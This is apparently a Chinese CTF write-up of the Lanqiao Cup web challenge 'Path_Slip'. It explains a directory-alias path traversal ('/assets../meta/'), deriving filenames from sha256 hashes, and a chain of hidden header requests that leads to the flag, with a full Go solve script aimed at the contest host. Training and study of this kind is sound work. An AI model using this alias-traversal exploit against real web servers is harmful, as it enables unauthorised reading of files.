---
title: 蓝桥杯-Path_Slip
url: https://mp.weixin.qq.com/s/7PqyxlP-_76Nk3YqNsRsjQ
source: Doonsec's feed
date: 2026-04-26
fetch_date: 2026-04-27T05:06:25.908304
---

# 蓝桥杯-Path_Slip

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uFfXaaQWh2fyM0BFb003maYomvH2s7Q1u2uI6byImIYibhMTSrZK8zPfVMC4SjBe4pRQmBTya3T9yCCpPicKRk4V9zdFqIicSEBLEDjR6CFDs0/0?wx_fmt=jpeg)

# 蓝桥杯-Path\_Slip

原创

Mystery
Mystery

小M安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

操作内容

进入题目后，页面显示为一个公开的静态资源路径/assets/readme.txt。

访问/assets/readme.txt后，我拿到了第一组关键提示。提示要求保留sid Cookie，并指出如果能从/assets“横向移动”一步，就可以从/meta/index.txt 开始。

尝试常规的路径穿越（如/assets/../meta/index.txt）均返回 404，但根据题目关于“目录映射问题”的提示，我测试发现访问/assets../meta/index.txt可以成功读取内容。这证实了服务器在目录别名配置上存在缺陷，允许通过 /assets..跨越到同级的/meta/目录 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/uFfXaaQWh2fTIypfzqr9rTTIK0CIyQiaOvb1x2FgmSriadd6F1aKG5zjZjNTQsvAha5uIb6OJIngdkXM0FNKHkn7AuPqib2te7ianbYib0Te0fZY/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/uFfXaaQWh2eYLeBbLY49uvQqTAGTUgOXBLT3gTnrgibdkDpN3mZSicfr0PYVW5tq1GrBJtgwtWhgooGURhia5WeI2KC9ibb4yQlyZpVEL1476zw/640?wx_fmt=png)

在 /meta/index.txt 中，我发现了 5 个标签（labels）以及文件名的计算公式 。公式中需要的 frame-space 和 frame-window 参数，我通过观察静态资源的响应头 X-Mirror-Rail 成功获取：space=cards;window=6:18

根据公式：name = sha256(sid|label|cards).hexdigest()[6:18] + ".txt"，我为每个标签计算了唯一的动态文件名，并成功读取了卡片内容。

![](https://mmbiz.qpic.cn/mmbiz_png/uFfXaaQWh2eR3Ondv3aPc2gA0iaKMibcaiaAhwTrrngP1KBGvWvSX4SvsdeXSxwpSeicIXAsibjGQlz0CguU1SGKpWaQUszG2xgMgZ6sJDnaIkcc/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/uFfXaaQWh2eyTM6dfsrNP8PMCceNHrgN8GusleTNQrhSdtkZJuKnObNEMIJcGY2hDTnsmMAWDOhSgrrnEiciahtmOdknSdDPxyo98qcibYHMk8/640?wx_fmt=png)

 构建利用链

：

对/oracle发送HEAD 请求（即“quiet verb”），并携带请求头X-Knock: hush，以此从响应头中交换到 X-Trace 凭证

将X-Trace的前 8 位进行两两交换（pair-swap）得到slot；同时通过卡片中的字符串交织算法得出盐值 slip\_route\_v3

首先访问/stage/{slot}/pose 并在响应头中截获 X-Ticket-Hint；最后带着这个Hint冲击/vault/{slot}/pass目标

```
构造脚本：package main import (   "crypto/sha256"   "crypto/tls"   "encoding/hex"   "fmt"   "io"   "net/http"   "net/http/cookiejar"   "regexp"   "strconv") const BASE = "https://eci-2ze7twsu489m878xc7ur.cloudeci1.ichunqiu.com:80" func main() {   jar, _ := cookiejar.New(nil)   client := &http.Client{      Jar: jar,      Transport: &http.Transport{         TLSClientConfig: &tls.Config{InsecureSkipVerify: true},      },   }    _, err := client.Get(BASE + "/")   if err != nil {      panic(err)   }    resp, _ := client.Get(BASE + "/assets/readme.txt")   rail := resp.Header.Get("X-Mirror-Rail")   re := regexp.MustCompile(`space=([^;]+);window=(\d+):(\d+)`)   matches := re.FindStringSubmatch(rail)   space := matches[1]   start, _ := strconv.Atoi(matches[2])   end, _ := strconv.Atoi(matches[3])    var sid string   for _, cookie := range jar.Cookies(resp.Request.URL) {      if cookie.Name == "sid" {         sid = cookie.Value      }   }    labels := []string{"knock", "dance", "salt", "route", "echo"}   for _, label := range labels {      data := fmt.Sprintf("%s|%s|%s", sid, label, space)      hash := sha256.Sum256([]byte(data))      name := hex.EncodeToString(hash[:])[start:end] + ".txt"      client.Get(BASE + "/assets../meta/" + name)   }    req, _ := http.NewRequest("HEAD", BASE+"/oracle", nil)   req.Header.Set("X-Knock", "hush")   oracleResp, _ := client.Do(req)   trace := oracleResp.Header.Get("X-Trace")    tBytes := []byte(trace)   for i := 0; i < 8; i += 2 {      tBytes[i], tBytes[i+1] = tBytes[i+1], tBytes[i]   }   slot := string(tBytes[:8])      tokenRaw := fmt.Sprintf("%s.%s.slip_route_v3", sid, trace)   tokenHash := sha256.Sum256([]byte(tokenRaw))   token := hex.EncodeToString(tokenHash[:])[:16]    stageURL := fmt.Sprintf("%s/stage/%s/pose?token=%s", BASE, slot, token)   stageResp, _ := client.Get(stageURL)   hint := stageResp.Header.Get("X-Ticket-Hint")    vaultURL := fmt.Sprintf("%s/vault/%s/pass?token=%s", BASE, slot, token)   finalReq, _ := http.NewRequest("GET", vaultURL, nil)   finalReq.Header.Set("X-Ticket-Hint", hint)   finalResp, _ := client.Do(finalReq)      flag, _ := io.ReadAll(finalResp.Body)   fmt.Printf("%s", string(flag))}
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/uFfXaaQWh2emB7ts2NbR8Paxr984De8rIcRxZD8ShPJZiadbAV1XJKqHY7tHhuW4sCNYhxegxW4U4icu365rD6j7OIuLJIQXOZGAEK5QXEichU/640?wx_fmt=png&from=appmsg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/lQpMPibOoPZUhKNJsgpu3UNbvTbia0v1QWic69PIdU3npibKaGxniajz4l5WwX161ygxDUSziaiaD8BW58xibtp6c5fc9g/0?wx_fmt=png)

小M安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/lQpMPibOoPZUhKNJsgpu3UNbvTbia0v1QWic69PIdU3npibKaGxniajz4l5WwX161ygxDUSziaiaD8BW58xibtp6c5fc9g/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过